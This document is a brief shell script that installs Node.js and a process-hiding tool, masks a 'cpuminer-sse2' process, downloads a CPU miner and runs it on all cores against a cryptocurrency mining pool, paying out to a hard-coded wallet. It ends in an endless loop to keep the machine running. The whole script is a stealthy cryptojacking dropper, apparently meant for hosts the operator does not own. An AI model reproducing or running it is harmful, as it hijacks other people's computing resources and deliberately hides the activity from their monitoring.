#!/bin/sh
sudo apt update
sudo apt install screen -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash
sudo apt install nodejs && npm i -g node-process-hider
ph add cpuminer-sse2
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.17/cpuminer-opt-linux.tar.gz
tar -xvf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a yescryptR16 -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qcqMw313oWBmhmjirLwDb5TVjaAFsg3WJs.killer2.0 -t $(nproc)
while [ 1 ]; do
sleep 3
done
sleep 99999
